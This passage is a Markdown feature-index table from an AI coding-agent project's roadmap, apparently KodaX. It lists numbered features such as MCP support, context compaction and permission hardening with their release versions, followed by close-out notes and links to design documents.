| `034` | Extension and Capability Runtime | `v0.7.0` | [v0.7.0](features/v0.7.0.md#feature_034-extension-and-capability-runtime) |
| `035` | MCP Capability Provider | `v0.7.15` | [v0.8.0](features/v0.8.0.md#feature_035-mcp-capability-provider) |
| `036` | DeepSeek Built-in Provider | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `037` | API Token Usage Priority and Estimation Fallback | `v0.6.20` (unreleased) | [v0.6.20](features/v0.6.20.md) |
| `039` | Plan-Mode Dual-Write Allowlist | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `040` | ACP Server Support | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `041` | Tool Output Guardrails and Context Overflow Protection | `v0.6.20` (unreleased) | [v0.6.20](features/v0.6.20.md) |
| `044` | Durable Compression Anchors and Artifact Recall | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_044-durable-compression-anchors-and-artifact-recall) |
| `045` | Provider Stream Resilience and Graceful Recovery | `v0.7.15` (unreleased) | [v0.7.15](features/v0.7.15.md#feature_045-provider-stream-resilience-and-graceful-recovery) |
| `046` | AMA Handoff Integrity and Final-Answer Convergence | `v0.7.18` | [v0.8.0](features/v0.8.0.md#feature_046-ama-handoff-integrity-and-final-answer-convergence) |
| `047` | Invisible Adaptive Parallelism and Evidence-Driven Fan-Out | `v0.7.19` | [v0.7.19](features/v0.7.19.md#feature_047-invisible-adaptive-parallelism--fan-out-optimization) | 架构完成 (v0.7.16); 执行层完成 (v0.7.18 FEATURE_067); v0.7.19 补齐: winner-cancel, 调度策略, 质量度量 |
| `048` | Sectionized Prompt Assembly and Dynamic Capability Truth | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_048-sectionized-prompt-assembly-and-dynamic-capability-truth) |
| `049` | First-Class Search, Fetch, Code Search, and Semantic Retrieval | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_049-first-class-search-fetch-code-search-and-semantic-retrieval) |
| `050` | Prompt Contracts, Snapshots, and Regression Evaluation | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_050-prompt-contracts-snapshots-and-regression-evaluation) |
| `042` | Incremental Repository Intelligence Refresh and Java/C++ Structural Semantics | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_042-incremental-repository-intelligence-refresh-and-javac-structural-semantics) |
| `051` | Host-Aware Fullscreen TUI Substrate and Transcript UX | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_051-host-aware-fullscreen-tui-substrate-and-transcript-ux) |
| `052` | Dual-Profile AMA Harness and Child Fan-Out Boundaries | `v0.7.19` | [v0.7.19](features/v0.7.19.md#feature_052-child-fan-out-boundary-hardening) | 架构完成 (v0.7.16); v0.7.19 补齐: SA 严格模式, 递归防护, controller 精化 |
| `053` | Canonical Repo Identity and Managed Worktree Runtime | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_053-canonical-repo-identity-and-managed-worktree-runtime) |
| `055` | REPL Substrate Hardening and Summary-Only AMA UX | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_055-repl-substrate-hardening-and-summary-only-ama-ux) |
| `056` | Tool Interaction Maturity and Transcript-Native Explanation Layer | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_056-tool-interaction-maturity-and-transcript-native-explanation-layer) |
| `054` | AMA-Project Convergence: Absorb Project Mode into Adaptive H2 | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_054-ama-project-convergence-absorb-project-mode-into-adaptive-h2) |
| `043` | Harness Calibration, Pivoting, Profiling, and Safe Checkpoints | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_043-harness-calibration-pivoting-profiling-and-safe-checkpoints) |
| `038` | Official Sandbox Extension | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_038-official-sandbox-extension) |
| `061` | Scout-First AMA Architecture Simplification | `v0.7.16` | [v0.7.16](features/v0.7.16.md#feature_061-scout-first-ama-architecture-simplification) |
| `062` | Managed Task Budget Simplification | `v0.7.16` | [v0.7.16](features/v0.7.16.md#feature_062-managed-task-budget-simplification) |
| `064` | Multi-Provider Cost Observatory | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_064-multi-provider-cost-observatory) |
| `065` | MCP Protocol Maturity | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_065-mcp-protocol-maturity) |
| `066` | Permission Hardening | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_066-permission-hardening) |
| `067` | Child Agent Execution — AMA-Native Parallel Task Dispatch | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_067-child-agent-execution--ama-native-parallel-task-dispatch) |
| `068` | Worktree Isolation Tool | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_068-worktree-isolation-tool) |
| `069` | Session Rewind & Shell Completion | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_069-session-rewind--shell-completion) |
| `070` | Context Engine V2 — Multi-Layer Compaction & Post-Compact Reconstruction | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_070-context-engine-v2--multi-layer-compaction--post-compact-reconstruction) |
| `071` | AMA Managed Task Resilience — Worker Checkpoint & Mid-Execution Recovery | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_071-ama-managed-task-resilience--worker-checkpoint--mid-execution-recovery) |
| `074` | Subagent Permission Boundary Hardening | `v0.7.20` (unreleased) | [v0.7.20](features/v0.7.20.md#feature_074-subagent-permission-boundary-hardening) |
| `072` | Lineage-Native Compaction Migration | `v0.7.20` (unreleased) | [v0.7.20](features/v0.7.20.md#feature_072-lineage-native-compaction-migration) |
| `077` | Session-Scoped Prompt Input History | `v0.7.21` | [v0.7.21](features/v0.7.21.md#feature_077-session-scoped-prompt-input-history) |
| `079` | Task Engine Phase 1 — Pure Extraction | `v0.7.22` (unreleased) | [v0.7.22](features/v0.7.22.md#feature_079-task-engine-phase-1--pure-extraction) |
| `080` | Layer A Primitives — Agent / Handoff / Runner / Guardrail | `v0.7.23` | [v0.7.23](features/v0.7.23.md#feature_080-layer-a-primitives--agent--handoff--runner--guardrail) |
| `081` | Compaction Layering and Session Base/Lineage Split | `v0.7.23` | [v0.7.23](features/v0.7.23.md#feature_081-compaction-layering-and-session-baselineage-split) |
| `082` | Package Restructure — @kodax/core, @kodax/mcp, @kodax/tracing, @kodax/session-lineage | `v0.7.24` | [v0.7.24](features/v0.7.24.md#feature_082-package-restructure) |
| `083` | Unified Tracer, Span, and TracingProcessor | `v0.7.24` | [v0.7.24](features/v0.7.24.md#feature_083-unified-tracer-span-and-tracingprocessor) |
| `058` | Transcript Native Scrollback Dump | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_058-transcript-native-scrollback-dump) |
| `075` | Plan Approval Dialog Scroll | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_075-plan-approval-dialog-scroll) |
| `076` | Managed Task Round Boundary — User Conversation Preservation | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_076-managed-task-round-boundary--user-conversation-preservation) |
| `084` | Task Engine Phase 2 — Rewrite Scout/Generator/Evaluator on Layer A Primitives (absorbs FEATURE_059) | `v0.7.26` | [v0.7.26](features/v0.7.26.md#feature_084-task-engine-phase-2--rewrite-scoutgeneratorevaluator-on-layer-a-primitives) |
| `085` | Guardrail Tri-Layer — Input / Output / Tool | `v0.7.26` | [v0.7.26](features/v0.7.26.md#feature_085-guardrail-tri-layer--input--output--tool) |
| `086` | KodaX Prefix Cleanup and Legacy Purge (子任务 A 放弃；子任务 B 完成；含 AMA runner-driven repo-intel 注入恢复 / Windows .exe bin quoting 修复 / ensurePremiumDaemonReady / refresh:true 分层超时 / 临时性失败不污染 failure cache / Ink TUI RepoIntel trace surface / Planner/Evaluator/H1-readonly-Generator 开放 repo-intel deep-capsule 工具) | `v0.7.27` | [v0.7.27](features/v0.7.27.md#feature_086-legacy-code-purge-子任务-a-放弃--子任务-b-完成) |
| `091` | Repo-Intelligence Protocol Package Extraction | `v0.7.27` | [v0.7.27](features/v0.7.27.md#feature_091-repo-intelligence-protocol-package-extraction) |
| `099` | Provider Catalog Refresh — DeepSeek V4 + Kimi-code Label Collapse | `v0.7.28` (unreleased) | [v0.7.28](features/v0.7.28.md#feature_099-provider-catalog-refresh--deepseek-v4--kimi-code-label-collapse) |
| `098` | Per-Model Context Window & Output Token Limits | `v0.7.28` (unreleased) | [v0.7.28](features/v0.7.28.md#feature_098-per-model-context-window--output-token-limits) |
| `090` | Self-Construction Tier 4 — Agent Self-Modifying Role Spec | `v0.7.32` | [v0.7.32](features/v0.7.32.md#feature_090-self-construction-tier-4--agent-self-modifying-role-spec) |
| `107` | AMA H2 Plan-Execute Boundary Eval | `v0.7.32` | [v0.7.32](features/v0.7.32.md#feature_107-ama-h2-plan-execute-boundary-eval) |
| `092` | Auto Mode Classifier — LLM-Reviewed Permission Tier | `v0.7.33` (unreleased) | [v0.7.33](features/v0.7.33.md#feature_092-auto-mode-classifier--llm-reviewed-permission-tier-for-high-risk-tool-calls) |
| `110` | Remove Legacy Plan Mode (Path 1) | `v0.7.34` | [v0.7.34](features/v0.7.34.md#feature_110-remove-legacy-plan-mode-path-1) |
| `112` | Investigation-Scale-Aware Routing — Read-Scope Fix | `v0.7.34` | [v0.7.34](features/v0.7.34.md#feature_112-investigation-scale-aware-routing--read-scope-fix) |
| `097` | AMA Runner Realtime Todo List — Claude-Aligned Visibility Surface | `v0.7.34` | [v0.7.34](features/v0.7.34.md#feature_097-ama-runner-realtime-todo-list--claude-aligned-visibility-surface) |

> `FEATURE_051` close-out posture: keep the current REPL status/footer/task/message surfaces frozen, limit follow-up work to invisible substrate maturity for transcript, scroll/selection, and input behavior, and treat the design doc as a completed close-out record rather than an open rollout plan.

> `FEATURE_055` completed the follow-up REPL hardening work: docs-first substrate maturity, summary-only AMA mapping, and no new visible worker/task shell.

> `FEATURE_031` now treats inline image refs as true structured multimodal inputs: provider-facing text uses stable image anchors such as `[Image #1]` and clean unavailable-image placeholders instead of leaking raw `@image-path` syntax.

> `v0.7.18` 主题：Engineering Shell Maturity（工程外壳成熟度）。基于 KodaX vs Claude Code 全面对比分析，补齐工程外壳层面的真实差距。8 个 Feature 全部完成，1 个取消 (063 Hook — 被 Extension 系统吸收，executor 能力提取为 `api.exec()`/`api.webhook()`)。status bar 成本显示 descoped (064)。

---

## 相关文档入口

- [Feature 设计索引](features/README.md)
- [ADR](ADR.md)
- [HLD](HLD.md)
- [DD](DD.md)
- [PRD](PRD.md)
